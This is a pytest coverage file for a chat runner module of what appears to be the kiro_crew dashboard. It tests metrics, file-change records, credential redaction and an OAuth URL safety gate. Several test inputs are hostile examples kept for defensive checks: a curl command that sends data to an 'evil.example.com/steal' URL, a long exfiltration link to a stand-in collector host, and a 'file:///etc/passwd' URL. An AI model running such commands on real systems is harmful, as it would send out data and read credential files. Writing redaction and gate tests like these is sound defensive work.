"""Coverage tests for ``kiro_crew.dashboard.chat_runner``: what a turn emits and records.

Covers the turn and time-to-first-token metrics, file snapshots and file-change
records, turn stats, ACP string redaction, the MCP OAuth URL gate and banners, the
channel mirror ladder and linked-Slack delivery, segment flush with its redaction
records, widget registration, native subagent cards and the context-usage frame.
``test_chat_runner_coverage.py`` describes the two harnesses the family uses; the
shared builders are in ``chat_runner_coverage_helpers.py``.
"""

from __future__ import annotations

import asyncio
import json
import os
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from chat_runner_coverage_helpers import _slot, _state

from kiro_crew.dashboard import chat_runner
from kiro_crew.metrics import turns as turns_mod
from kiro_crew.security import oauth_url_contains_credential

# ── turn metric ───────────────────────────────────────────────────────────


class TestTurnMetric:
    @pytest.mark.parametrize(
        "stop_reason,expected",
        [
            (None, "ok"),
            ("", "ok"),
            ("end_turn", "ok"),
            ("completed", "ok"),
            ("error: timeout waiting", "timeout"),
            ("error: pipe died", "error"),
        ],
    )
    def test_outcome_mapping(self, stop_reason, expected):
        assert chat_runner._turn_outcome(stop_reason) == expected

    def test_session_source_attribute_is_attached(self):
        recorder = MagicMock()
        # The emit and its source derivation live in ``metrics/turns.py`` so
        # every dispatch surface can reach them; chat_runner is only the
        # dashboard turn loop. The source comes from ``telemetry_channel_of``,
        # which — unlike infer_use_case — knows the background surfaces this
        # metric covers.
        with (
            patch.object(turns_mod, "telemetry_channel_of", return_value="cron"),
            patch.object(turns_mod, "get_recorder", return_value=recorder),
        ):
            chat_runner._emit_turn_metric(0, "end_turn", "cron:job", elapsed_ms=12)

        _, kwargs = recorder.histogram.call_args
        assert kwargs["attrs"]["session_source"] == "cron"
        assert kwargs["attrs"]["outcome"] == "ok"

    def test_use_case_failure_does_not_block_the_emit(self):
        """A broken source lookup must still leave the histogram emitted."""
        recorder = MagicMock()
        with (
            patch.object(turns_mod, "telemetry_channel_of", side_effect=RuntimeError("boom")),
            patch.object(turns_mod, "get_recorder", return_value=recorder),
        ):
            chat_runner._emit_turn_metric(50, "end_turn", "dashboard:x")

        recorder.histogram.assert_called_once()
        _, kwargs = recorder.histogram.call_args
        assert "session_source" not in kwargs["attrs"]

    def test_recorder_failure_is_swallowed(self):
        # The emit reads ``get_recorder`` from ``metrics/turns.py``, so that is
        # the binding the failure has to come from.
        with patch.object(
            turns_mod, "get_recorder", side_effect=RuntimeError("no recorder")
        ) as get_recorder:
            chat_runner._emit_turn_metric(50, "end_turn", "dashboard:x")

        get_recorder.assert_called_once_with()

    def test_zero_duration_skips_the_emit(self):
        recorder = MagicMock()
        with patch.object(turns_mod, "get_recorder", return_value=recorder):
            chat_runner._emit_turn_metric(0, "end_turn", "dashboard:x", elapsed_ms=0)
            recorder.histogram.assert_not_called()
            # The same patch does reach the emit once there is a duration.
            chat_runner._emit_turn_metric(0, "end_turn", "dashboard:x", elapsed_ms=12)

        assert recorder.histogram.call_args.args[1] == 12


# ── snapshot helpers ──────────────────────────────────────────────────────


class TestSnapshotHelpers:
    def test_safe_read_snapshot_declines_on_validator_error(self):
        with patch.object(chat_runner, "validate_file_path", side_effect=OSError("boom")):
            assert chat_runner._safe_read_snapshot("/tmp/whatever") is None

    def test_safe_read_snapshot_declines_a_directory(self, tmp_path):
        assert chat_runner._safe_read_snapshot(str(tmp_path)) is None

    def test_safe_read_snapshot_reads_a_regular_file(self, tmp_path):
        target = tmp_path / "note.txt"
        target.write_text("hello\n", newline="\n")

        snapshot = chat_runner._safe_read_snapshot(str(target))
        assert snapshot is not None
        assert snapshot.content == "hello\n"

    def test_truncate_snapshot_marks_the_cut(self):
        out = chat_runner._truncate_snapshot("x" * (chat_runner._MAX_SNAPSHOT + 10))

        assert out.content.endswith(f"... (truncated at {chat_runner._MAX_SNAPSHOT} chars)")
        assert out.truncated is True

    def test_reconstruct_declines_when_neither_state_is_plausible(self, tmp_path):
        """Ambiguous disk content must decline rather than fabricate a before."""
        target = tmp_path / "amb.txt"
        # oldStr twice (pre-write implausible) and the single-newStr reversal
        # candidate is tool-inconsistent, so neither hypothesis survives.
        target.write_text("cabab", newline="\n")

        out = chat_runner._classify_str_replace_before(str(target), {"oldStr": "ab", "newStr": "c"})

        assert out == (None, None)

    def test_reconstruct_declines_on_replace_all(self, tmp_path):
        target = tmp_path / "all.txt"
        target.write_text("aaa", newline="\n")

        assert chat_runner._classify_str_replace_before(
            str(target), {"oldStr": "a", "newStr": "b", "replaceAll": True}
        ) == (None, None)

    def test_reconstruct_declines_on_missing_params(self, tmp_path):
        target = tmp_path / "missing.txt"
        target.write_text("body", newline="\n")

        assert chat_runner._classify_str_replace_before(str(target), {"oldStr": "x"}) == (
            None,
            None,
        )

    def test_snapshot_write_target_ignores_non_write_commands(self):
        assert chat_runner._snapshot_write_target({"command": "read", "path": "/tmp/x"}) is None
        assert chat_runner._snapshot_write_target(None) is None

    def test_snapshot_write_target_prefers_the_diff_block(self, tmp_path):
        target = tmp_path / "create-me.txt"

        got = chat_runner._snapshot_write_target(
            {"command": "create", "path": str(target)}, diff_old_text=""
        )

        assert got is not None
        assert os.path.realpath(got["path"]) == os.path.realpath(str(target))
        assert got["content"] == ""

    def test_snapshot_write_target_records_empty_before_for_a_new_file(self, tmp_path):
        target = tmp_path / "not-yet.txt"

        got = chat_runner._snapshot_write_target({"command": "create", "path": str(target)})

        assert got == {
            "path": str(target),
            "canonical_path": chat_runner.validate_file_path(str(target)),
            "content": "",
            "truncated": False,
        }


class TestFlushFileChanges:
    def test_credentials_are_scrubbed_from_before_and_after(self, tmp_path):
        """A secret in a non-sensitive config must not reach message meta."""
        target = tmp_path / "config.ini"
        target.write_text("key=AKIAIOSFODNN7EXAMPLE\nafter\n", newline="\n")
        slot = _slot()
        slot.append("assistant", "done", "msg msg-a", broadcast=False)
        slot._file_changes = [
            {"path": str(target), "content": "key=AKIAIOSFODNN7EXAMPLE\nbefore\n"}
        ]

        chat_runner._flush_file_changes(slot)

        changes = slot.messages[-1]["meta"]["file_changes"]
        assert len(changes) == 1
        assert "AKIAIOSFODNN7EXAMPLE" not in changes[0]["before"]
        assert "AKIAIOSFODNN7EXAMPLE" not in changes[0]["after"]
        assert slot._dirty is True
        assert slot._file_changes == []

    def test_non_list_changes_are_ignored(self):
        """A MagicMock slot attribute is truthy — the isinstance gate matters."""
        slot = _slot()
        slot._file_changes = MagicMock()

        chat_runner._flush_file_changes(slot)

        assert slot.messages == []

    def test_synthetic_message_is_created_when_no_assistant_row_exists(self, tmp_path):
        target = tmp_path / "orphan.txt"
        target.write_text("after\n", newline="\n")
        slot = _slot()
        slot._file_changes = [{"path": str(target), "content": "before\n"}]

        chat_runner._flush_file_changes(slot)

        assert slot.messages[-1]["role"] == "assistant"
        assert slot.messages[-1]["meta"]["file_changes"][0]["after"] == "after\n"


class TestAttachTurnStats:
    def test_zero_elapsed_attaches_nothing(self):
        slot = _slot()
        slot.append("assistant", "hi", "msg msg-a", broadcast=False)

        chat_runner._attach_turn_stats(slot, 0, 0.0, 0.0)

        assert "turn_stats" not in (slot.messages[-1].get("meta") or {})

    def test_credits_and_cost_are_rounded_and_omitted_when_zero(self):
        slot = _slot()
        slot.append("assistant", "hi", "msg msg-a", broadcast=False)

        chat_runner._attach_turn_stats(slot, 1200, 0.123456, 0.0)

        stats = slot.messages[-1]["meta"]["turn_stats"]
        assert stats == {"elapsed_ms": 1200, "credits": 0.1235}

    def test_boundary_protects_a_previous_turns_message(self):
        """A turn that appended no assistant row must not overwrite the last one."""
        slot = _slot()
        slot.append("assistant", "prior turn", "msg msg-a", broadcast=False)
        boundary = len(slot.messages)

        chat_runner._attach_turn_stats(slot, 999, 0.0, 0.0, turn_boundary=boundary)

        assert "turn_stats" not in (slot.messages[-1].get("meta") or {})


# ── ACP string redaction / OAuth URL gate ─────────────────────────────────


class TestAcpRedaction:
    def test_empty_string_passes_through(self):
        assert chat_runner._redact_acp_string("") == ""

    def test_credential_is_scrubbed(self):
        out = chat_runner._redact_acp_string("token AKIAIOSFODNN7EXAMPLE")

        assert "AKIAIOSFODNN7EXAMPLE" not in out


class TestOauthUrlCredentialGate:
    @pytest.mark.parametrize(
        "url,refused",
        [
            pytest.param("", False, id="test_empty_url_is_not_a_credential"),
            pytest.param(
                "https://github.com/login/oauth/authorize?client_id=abc&state=xyz",
                False,
                id="test_plain_consent_url_is_allowed",
            ),
            # An invalid IPv6 authority makes urlparse raise ValueError inside the
            # shared security gate, which fails closed.
            pytest.param("https://[bad-ipv6/x", True, id="test_unparseable_url_is_refused"),
            pytest.param(
                "https://example.test/authorize?state=AKIAIOSFODNN7EXAMPLE1",
                True,
                id="test_credential_signature_inside_an_oauth_param_is_refused",
            ),
            pytest.param(
                "https://example.test/authorize?payload=" + ("A" * 260),
                True,
                id="test_exfiltration_pattern_in_a_non_oauth_param_is_refused",
            ),
        ],
    )
    def test_oauth_url_credential_gate(self, url, refused):
        assert oauth_url_contains_credential(url) is refused


class TestEmitMcpOauthRequest:
    def test_unsafe_scheme_renders_a_rejected_banner(self, tmp_path):
        state, slot = _state(tmp_path), _slot()

        chat_runner._emit_mcp_oauth_request(state, slot, "svc", "file:///etc/passwd")

        banner = slot.messages[-1]
        assert banner["role"] == "mcp_oauth"
        assert banner["meta"]["rejected_url"] is True
        assert banner["meta"]["error"] == "unsafe URL scheme"

    def test_credential_bearing_url_renders_a_rejected_banner(self, tmp_path):
        state, slot = _state(tmp_path), _slot()

        chat_runner._emit_mcp_oauth_request(
            state, slot, "svc", "https://example.test/a?state=AKIAIOSFODNN7EXAMPLE1"
        )

        assert slot.messages[-1]["meta"]["rejected_url"] is True

    def test_card_owned_annotation_rides_on_the_authorize_banner(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        url = "https://github.test/authorize?client_id=x"

        chat_runner._emit_mcp_oauth_request(state, slot, "github", url, card_owned=True)

        assert slot.messages[-1]["meta"]["card_owned"] is True
        # Assert the whole URL, not a prefix. A startswith() check would also
        # accept https://github.test.example.com/... -- a different host that
        # merely begins with the expected string -- so it is both a weaker
        # assertion and the pattern CodeQL flags as incomplete URL substring
        # sanitization.
        assert slot.messages[-1]["meta"]["oauth_url"] == url


class TestConnectionsManagedNames:
    def test_failure_fails_open_to_the_empty_set(self):
        with patch.object(chat_runner, "kirocrew_managed_names", side_effect=RuntimeError("io")):
            assert chat_runner._connections_managed_mcp_names() == frozenset()

    def test_intersection_of_managed_and_carded(self):
        with (
            patch.object(
                chat_runner, "kirocrew_managed_names", return_value={"github", "handmade"}
            ),
            patch.object(
                chat_runner,
                "get_visible_providers",
                return_value=[{"slug": "github"}, {"slug": "slack"}],
            ),
        ):
            assert chat_runner._connections_managed_mcp_names() == frozenset({"github"})


class TestDrainSessionInitOauthRequests:
    @pytest.mark.asyncio
    async def test_provider_without_the_accessor_is_a_noop(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        client = MagicMock()
        client.client = object()  # no pop_pending_oauth_requests

        await chat_runner._drain_session_init_oauth_requests(state, slot, client)

        assert slot.messages == []

    @pytest.mark.asyncio
    async def test_empty_pending_list_skips_ownership_resolution(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        client = MagicMock()
        client.client.pop_pending_oauth_requests = MagicMock(return_value=[])

        with patch.object(chat_runner, "_connections_managed_mcp_names") as managed:
            await chat_runner._drain_session_init_oauth_requests(state, slot, client)

        managed.assert_not_called()
        assert slot.messages == []

    @pytest.mark.asyncio
    async def test_non_dict_entries_are_skipped_and_the_rest_emitted(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        client = MagicMock()
        client.client.pop_pending_oauth_requests = MagicMock(
            return_value=[
                "not-a-dict",
                {"serverName": "github", "oauthUrl": "https://github.test/authorize?client_id=x"},
            ]
        )

        with patch.object(
            chat_runner, "_connections_managed_mcp_names", return_value=frozenset({"github"})
        ):
            await chat_runner._drain_session_init_oauth_requests(state, slot, client)

        banners = [m for m in slot.messages if m.get("role") == "mcp_oauth"]
        assert len(banners) == 1
        assert banners[0]["meta"]["card_owned"] is True


class TestMarkMcpOauthCompleted:
    def _open_banner(self, state, slot, name: str = "github") -> None:
        chat_runner._emit_mcp_oauth_request(
            state, slot, name, "https://x.test/authorize?client_id=1"
        )

    def test_no_matching_banner_is_a_noop(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        self._open_banner(state, slot, "github")
        before = len(slot.messages)

        chat_runner._mark_mcp_oauth_completed(state, slot, "other", True)

        assert len(slot.messages) == before
        assert "completed" not in slot.messages[-1]["meta"]

    def test_already_terminal_banner_is_not_patched_again(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        self._open_banner(state, slot)
        chat_runner._mark_mcp_oauth_completed(state, slot, "github", True)
        content_after_first = slot.messages[-1]["content"]

        chat_runner._mark_mcp_oauth_completed(state, slot, "github", False, "second try")

        assert slot.messages[-1]["content"] == content_after_first
        assert slot.messages[-1]["meta"]["completed"] is True

    def test_failure_records_the_redacted_error(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        self._open_banner(state, slot)

        chat_runner._mark_mcp_oauth_completed(
            state, slot, "github", False, "denied for AKIAIOSFODNN7EXAMPLE"
        )

        meta = slot.messages[-1]["meta"]
        assert meta["failed"] is True
        assert "AKIAIOSFODNN7EXAMPLE" not in meta["error"]
        assert "authentication failed" in slot.messages[-1]["content"]

    def test_untimestamped_banner_cannot_be_updated(self, tmp_path):
        """A history line with no ``ts`` has no update handle — bail, don't broadcast."""
        state, slot = _state(tmp_path), _slot()
        slot.messages.append(
            {"role": "mcp_oauth", "content": "legacy", "meta": {"server_name": "github"}}
        )

        chat_runner._mark_mcp_oauth_completed(state, slot, "github", True)

        assert not any(
            call.args and call.args[0] == "chat_message_update"
            for call in state.broadcast_ws.call_args_list
        )


# ── channel mirror ladder ─────────────────────────────────────────────────


class TestChannelTargetLadder:
    def test_missing_link_resolves_to_nothing(self, tmp_path):
        assert chat_runner._resolve_channel_target(_state(tmp_path), "dashboard:x", None) is None

    def test_slack_is_skipped(self, tmp_path):
        link = MagicMock(channel_type=chat_runner.SLACK_NAMESPACE, channel_id="C1")

        assert chat_runner._resolve_channel_target(_state(tmp_path), "dashboard:x", link) is None

    def test_governance_denial_skips_the_mirror(self, tmp_path):
        link = MagicMock(channel_type="telegram", channel_id="123", thread_id=None)
        with patch(
            "kiro_crew.platform.governance_profiles.vet_and_audit",
            return_value=MagicMock(permitted=False),
        ):
            assert (
                chat_runner._resolve_channel_target(_state(tmp_path), "dashboard:x", link) is None
            )

    def test_unregistered_transport_skips_the_mirror(self, tmp_path):
        state = _state(tmp_path)
        state.get_channel_transport = MagicMock(return_value=None)
        link = MagicMock(channel_type="telegram", channel_id="123", thread_id=None)

        with patch(
            "kiro_crew.platform.governance_profiles.vet_and_audit",
            return_value=MagicMock(permitted=True),
        ):
            assert chat_runner._resolve_channel_target(state, "dashboard:x", link) is None

    def test_transport_without_proactive_send_skips_the_mirror(self, tmp_path):
        state = _state(tmp_path)
        transport = MagicMock()
        transport.capabilities.supports_proactive_send = False
        state.get_channel_transport = MagicMock(return_value=transport)
        link = MagicMock(channel_type="wecom", channel_id="123", thread_id=None)

        with patch(
            "kiro_crew.platform.governance_profiles.vet_and_audit",
            return_value=MagicMock(permitted=True),
        ):
            assert chat_runner._resolve_channel_target(state, "dashboard:x", link) is None

    def test_capable_transport_is_returned(self, tmp_path):
        state = _state(tmp_path)
        transport = MagicMock()
        transport.capabilities.supports_proactive_send = True
        state.get_channel_transport = MagicMock(return_value=transport)
        link = MagicMock(channel_type="telegram", channel_id="123", thread_id=None)

        with patch(
            "kiro_crew.platform.governance_profiles.vet_and_audit",
            return_value=MagicMock(permitted=True),
        ):
            got = chat_runner._resolve_channel_target(state, "dashboard:x", link)

        assert got == (link, transport)


class TestMarkKiroSignedOut:
    def test_absent_service_is_a_noop(self):
        state = MagicMock(spec=["kiro_prerequisite_service"])
        state.kiro_prerequisite_service = None

        assert chat_runner._mark_kiro_signed_out(state) is None
        assert state.kiro_prerequisite_service is None

    def test_latch_failure_never_raises(self):
        state = MagicMock()
        state.kiro_prerequisite_service.mark_signed_out.side_effect = RuntimeError("io")

        chat_runner._mark_kiro_signed_out(state)

        state.kiro_prerequisite_service.mark_signed_out.assert_called_once_with()


class TestDeliverLinkedSlackMessage:
    @pytest.mark.asyncio
    async def test_no_slack_client_is_a_noop(self, tmp_path):
        state = _state(tmp_path)
        state.slack_client = None

        await chat_runner._deliver_linked_slack_message(
            state, _slot(), state.sessions, "dashboard:x", "signed out"
        )

        state.sessions.get_slack_link.assert_not_called()

    @pytest.mark.asyncio
    async def test_unlinked_session_is_a_noop(self, tmp_path):
        state = _state(tmp_path)
        state.slack_client = AsyncMock()

        await chat_runner._deliver_linked_slack_message(
            state, _slot(), state.sessions, "dashboard:x", "signed out"
        )

        state.sessions.get_slack_link.assert_called_once_with("dashboard:x")
        state.slack_client.post_message.assert_not_called()

    @pytest.mark.asyncio
    async def test_link_from_the_session_store_is_used(self, tmp_path):
        state = _state(tmp_path)
        state.slack_client = AsyncMock()
        state.sessions.get_slack_link = MagicMock(return_value=("111.222", "C123"))

        await chat_runner._deliver_linked_slack_message(
            state, _slot(), state.sessions, "dashboard:x", "signed out"
        )

        state.slack_client.post_message.assert_awaited_once_with("C123", "signed out", "111.222")

    @pytest.mark.asyncio
    async def test_post_failure_is_swallowed(self, tmp_path):
        state = _state(tmp_path)
        state.slack_client = AsyncMock()
        state.slack_client.post_message.side_effect = RuntimeError("slack down")
        slot = _slot()
        slot._slack_thread_ts = "1.2"
        slot._slack_channel = "C1"

        await chat_runner._deliver_linked_slack_message(
            state, slot, state.sessions, "dashboard:x", "signed out"
        )

        state.slack_client.post_message.assert_awaited_once_with("C1", "signed out", "1.2")
        state.sessions.get_slack_link.assert_not_called()


class TestCrossSurfaceReply:
    @pytest.mark.asyncio
    async def test_empty_text_is_not_mirrored(self, tmp_path):
        state = _state(tmp_path)

        with patch.object(chat_runner, "_resolve_channel_target") as resolve:
            await chat_runner._deliver_cross_surface_reply(state, "dashboard:x", "")

        resolve.assert_not_called()
        state.sessions.get_mirror_link.assert_not_called()

    @pytest.mark.asyncio
    async def test_reply_is_chunked_per_transport_limit(self, tmp_path):
        state = _state(tmp_path)
        transport = AsyncMock()
        transport.capabilities.max_message_chars = 10
        # Explicit 0: a MagicMock attribute is a child object, not a number,
        # so chunk_for_transport cannot compare it. 0 = not byte-capped, which
        # is the character path this test is about.
        transport.capabilities.max_message_bytes = 0
        link = MagicMock(channel_id="123", thread_id=None, channel_type="telegram")

        with patch.object(chat_runner, "_resolve_channel_target", return_value=(link, transport)):
            await chat_runner._deliver_cross_surface_reply(state, "dashboard:x", "ab " * 20)

        assert transport.send_message.await_count > 1

    @pytest.mark.asyncio
    async def test_transport_failure_never_disrupts_the_turn(self, tmp_path):
        state = _state(tmp_path)
        transport = AsyncMock()
        transport.capabilities.max_message_chars = 4096
        transport.capabilities.max_message_bytes = 0
        transport.send_message.side_effect = RuntimeError("offline")
        link = MagicMock(channel_id="123", thread_id=None, channel_type="telegram")

        with patch.object(chat_runner, "_resolve_channel_target", return_value=(link, transport)):
            await chat_runner._deliver_cross_surface_reply(state, "dashboard:x", "hello")

        transport.send_message.assert_awaited_once_with("123", "hello", thread_id=None)


class TestPrepareMirrorMsg:
    def test_truncates_then_redacts(self):
        out = chat_runner._prepare_mirror_msg("x" * 900)

        assert len(out) <= 500

    def test_none_becomes_empty(self):
        assert chat_runner._prepare_mirror_msg("") == ""


# ── segment flush / widget registration ───────────────────────────────────


class TestFlushSegment:
    def test_pending_variants_are_attached_and_broadcast(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        slot._pending_variants = [{"content": "older draft", "ts": "1"}, "not-a-dict"]

        chat_runner._flush_segment(state, slot, "newest draft")

        last = slot.messages[-1]
        assert last["variant_idx"] == 1
        assert [v["content"] for v in last["variants"]] == ["older draft", "newest draft"]
        assert slot._pending_variants == []
        assert any(
            call.args[0] == "chat_variant_switch" for call in state.broadcast_ws.call_args_list
        )

    def test_credentials_in_the_segment_are_redacted(self, tmp_path):
        state, slot = _state(tmp_path), _slot()

        chat_runner._flush_segment(state, slot, "secret AKIAIOSFODNN7EXAMPLE here")

        # Target the assistant row by role, not `messages[-1]`: a redacted
        # segment now also appends a notice row after it, and asserting on the
        # last row would pass even if the assistant text still held the secret.
        # Selected via a list + assertion rather than `next(...)` so a missing row
        # fails on an assertion naming what WAS there, instead of a StopIteration
        # that cannot distinguish "no assistant row" from "the flush threw".
        assistants = [m for m in slot.messages if m.get("role") == "assistant"]
        assert len(assistants) == 1, f"expected one assistant row, got {slot.messages}"
        assert "AKIAIOSFODNN7EXAMPLE" not in assistants[0]["content"]

    def test_a_redacted_credential_is_described_not_noticed(self, tmp_path):
        """The lock tag replaces the grey notice: the row carries one record per
        placeholder and no notice row is appended."""
        from kiro_crew.security import REDACTED_CREDENTIAL_TAG

        state, slot = _state(tmp_path), _slot()
        command = "echo 'DATABASE_URL=postgresql://user:pass@host:5432/db' >> .env"

        chat_runner._flush_segment(state, slot, command)

        assert [m.get("role") for m in slot.messages] == ["assistant"]
        assistant = slot.messages[0]
        assert "user:pass" not in assistant["content"]
        assert REDACTED_CREDENTIAL_TAG in assistant["content"]
        records = assistant["meta"]["redactions"]
        assert [(r["ordinal"], r["rule"]) for r in records] == [(0, "url_userinfo")]
        assert "user:pass" not in json.dumps(records)

    def test_every_placeholder_gets_a_record_in_order(self, tmp_path):
        state, slot = _state(tmp_path), _slot()

        chat_runner._flush_segment(
            state, slot, "first postgresql://a:b@h1/db then mysql://c:d@h2/db"
        )

        records = slot.messages[0]["meta"]["redactions"]
        assert [r["ordinal"] for r in records] == [0, 1]

    def test_a_clean_segment_gets_no_notice_and_no_records(self, tmp_path):
        state, slot = _state(tmp_path), _slot()

        chat_runner._flush_segment(state, slot, "here is a plain answer")

        assert [m.get("role") for m in slot.messages] == ["assistant"]
        assert "redactions" not in (slot.messages[0].get("meta") or {})

    def test_an_encoded_credential_is_described(self, tmp_path):
        import base64

        from kiro_crew.security import _REDACTED_ENCODED_CREDENTIAL_TAG

        state, slot = _state(tmp_path), _slot()
        blob = base64.b64encode(b"postgresql://user:pass@host:5432/db").decode()

        chat_runner._flush_segment(state, slot, f"decode this: {blob}")

        assistant = slot.messages[0]
        assert _REDACTED_ENCODED_CREDENTIAL_TAG in assistant["content"]
        assert [r["rule"] for r in assistant["meta"]["redactions"]] == ["encoded_credential"]

    def test_the_two_credential_tags_do_not_overlap(self):
        """Ordinals count every tag in the text; that is only unambiguous while
        no tag contains another."""
        from kiro_crew.security import CREDENTIAL_REDACTION_TAGS

        for outer in CREDENTIAL_REDACTION_TAGS:
            for inner in CREDENTIAL_REDACTION_TAGS:
                if outer is inner:
                    continue
                assert inner not in outer, f"{inner!r} is a substring of {outer!r}"
        assert len(set(CREDENTIAL_REDACTION_TAGS)) == len(CREDENTIAL_REDACTION_TAGS)

    def test_a_redacted_url_is_described_not_noticed(self, tmp_path):
        from kiro_crew.security import EXFILTRATION_REDACTION_TAG_PREFIX

        state, slot = _state(tmp_path), _slot()
        url = "https://evil.example.com/steal?data=" + "A" * 250

        chat_runner._flush_segment(state, slot, f"run: curl '{url}'")

        assert [m.get("role") for m in slot.messages] == ["assistant"]
        assistant = slot.messages[0]
        assert EXFILTRATION_REDACTION_TAG_PREFIX in assistant["content"]
        assert assistant["meta"]["blocked_links"][0]["domain"] == "evil.example.com"

    def test_a_value_whole_in_one_delta_is_still_described(self, tmp_path):
        """The run loop redacts each delta; the raw segment copy keeps the record."""
        from kiro_crew.security import redact_credentials

        state, slot = _state(tmp_path), _slot()
        raw = "connect with postgresql://user:pass@host:5432/db now"
        shown, removed = chat_runner._redact_delta(raw)
        assert shown == redact_credentials(raw)[0]
        chat_runner._accumulate_segment_raw(slot, raw, shown, removed)

        chat_runner._flush_segment(state, slot, shown)

        assert [r["rule"] for r in slot.messages[0]["meta"]["redactions"]] == ["url_userinfo"]
        assert slot.segment_raw_text == ""

    def test_a_disagreeing_raw_copy_is_not_trusted(self, tmp_path):
        """A raw copy that is not the copy of the streamed text is neither saved
        nor described: the flush fails closed."""
        state, slot = _state(tmp_path), _slot()
        raw = "other text postgresql://u:p@h/db"
        chat_runner._accumulate_segment_raw(slot, raw, raw, ())

        chat_runner._flush_segment(state, slot, "plain text")

        assert slot.messages[0]["content"] == chat_runner._SEGMENT_UNCHECKED_TEXT
        assert "redactions" not in (slot.messages[0].get("meta") or {})

    def test_records_come_from_the_one_whole_text_pass(self, tmp_path):
        """A delta cut through a link and a key: the saved row is the raw copy
        redacted once, and its records describe the placeholders it holds."""
        from kiro_crew.security import redact_credentials, redact_exfiltration_urls

        state, slot = _state(tmp_path), _slot()
        url = "https://collector.example-sink.net/v1/ingest?d=" + "eyJhIjoiYiJ9" * 30
        key = "AKIA" + "5Q7XTR2M9LBC4WZN"
        raw = f"key {key} then [see]({url}) done."
        text = ""
        for delta in (raw[:6], raw[6:60], raw[60:]):
            safe, removed = chat_runner._redact_delta(delta)
            assert (
                safe
                == redact_credentials(redact_exfiltration_urls(delta)[0], defer_token_param=True)[0]
            )
            chat_runner._accumulate_segment_raw(slot, delta, safe, removed)
            text += safe

        chat_runner._flush_segment(state, slot, text)

        content, meta = slot.messages[0]["content"], slot.messages[0]["meta"]
        assert key[4:] not in content and "eyJ" not in content
        assert [r["domain"] for r in meta["blocked_links"]] == ["collector.example-sink.net"]
        assert [r["rule"] for r in meta["redactions"]] == ["aws_access_key_id"]

    def test_trailing_stop_event_is_replaced_below_the_segment(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        slot.append("chunk", "partial", "chunk", broadcast=False)
        slot.append("stop", "", json.dumps({"kind": "stop_event"}), broadcast=False)

        chat_runner._flush_segment(state, slot, "final text")

        assert [m.get("role") for m in slot.messages] == ["assistant", "stop"]

    def test_unparseable_cls_is_not_a_stop_event(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        slot.append("chunk", "partial", "not json", broadcast=False)

        chat_runner._flush_segment(state, slot, "final text")

        assert [m.get("role") for m in slot.messages] == ["assistant"]


class TestScheduleWidgetRegistration:
    @pytest.mark.parametrize(
        "text,loop_probed",
        [
            pytest.param("", False, id="test_empty_text_registers_nothing"),
            pytest.param(
                "<mcwidget>x</mcwidget>", True, id="test_no_running_loop_skips_registration"
            ),
        ],
    )
    def test_nothing_is_scheduled_without_text_or_loop(self, tmp_path, text, loop_probed):
        state, slot = _state(tmp_path), _slot()

        with (
            patch.object(
                chat_runner.asyncio, "get_running_loop", wraps=asyncio.get_running_loop
            ) as probe,
            patch.object(chat_runner.asyncio, "create_task") as create,
        ):
            chat_runner._schedule_widget_registration(state, slot, text, "1")

        assert probe.called is loop_probed
        create.assert_not_called()

    def test_restricted_session_never_registers(self, tmp_path):
        """Incognito slots are denied artifact writes at the HTTP gate too."""
        state, slot = _state(tmp_path), _slot()
        slot.memory_mode = "temporary"
        assert slot.is_restricted is True

        with patch.object(chat_runner.asyncio, "create_task") as create:
            chat_runner._schedule_widget_registration(state, slot, "<mcwidget>x</mcwidget>", "1")

        create.assert_not_called()

    @pytest.mark.asyncio
    async def test_widget_and_image_each_schedule_one_task(self, tmp_path):
        state, slot = _state(tmp_path), _slot()

        with (
            patch.object(chat_runner, "register_widgets_off_loop", new=AsyncMock()) as widgets,
            patch.object(chat_runner, "register_images_off_loop", new=AsyncMock()) as images,
        ):
            chat_runner._schedule_widget_registration(
                state, slot, "<mcwidget>x</mcwidget> ![a](/tmp/a.png)", "1"
            )
            # flake-ok: pre-existing zero-length yield that lets a task the call scheduled run, moved verbatim; tracked for a de-flake pass
            await asyncio.sleep(0)

            assert widgets.await_count == 1
            assert images.await_count == 1


class TestTtftMetric:
    def test_emission_failure_is_swallowed(self):
        with patch(
            "kiro_crew.metrics.provider.get_recorder", side_effect=RuntimeError("down")
        ) as get_recorder:
            chat_runner._emit_ttft_metric(0.0, "dashboard:x", is_new=True, resumed=False)

        get_recorder.assert_called_once_with()

    def test_attributes_split_cold_and_resumed_populations(self):
        recorder = MagicMock()
        with patch("kiro_crew.metrics.provider.get_recorder", return_value=recorder):
            chat_runner._emit_ttft_metric(0.0, "dashboard:x", is_new=True, resumed=True)

        attrs = recorder.histogram.call_args.kwargs["attrs"]
        assert attrs["first_turn"] is True
        assert attrs["resumed"] is True


# ── native subagent cards ─────────────────────────────────────────────────


class TestNativeSubagentCards:
    def test_non_list_payload_is_ignored(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        tracker: dict = {}

        chat_runner._native_subagent_sync(state, slot, "not-a-list", tracker)

        assert tracker == {}

    def test_entry_without_a_task_is_marked_done_immediately(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        tracker: dict = {}

        chat_runner._native_subagent_sync(
            state, slot, [{"sessionId": "s1", "role": "worker"}], tracker
        )

        assert tracker["s1"]["done"] is True
        assert tracker["s1"]["task"] == ""

    def test_terminal_status_completes_the_card_with_a_redacted_error(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        tracker: dict = {}
        entry = {"sessionId": "s2", "role": "worker", "initialQuery": "do it"}

        chat_runner._native_subagent_sync(state, slot, [entry], tracker)
        entry["status"] = {"type": "failed", "message": "boom AKIAIOSFODNN7EXAMPLE"}
        chat_runner._native_subagent_sync(state, slot, [entry], tracker)

        assert tracker["s2"]["done"] is True
        assert "AKIAIOSFODNN7EXAMPLE" not in tracker["s2"]["error"]

    def test_status_message_surfaces_as_the_current_tool(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        tracker: dict = {}
        entry = {"sessionId": "s3", "initialQuery": "do it"}

        chat_runner._native_subagent_sync(state, slot, [entry], tracker)
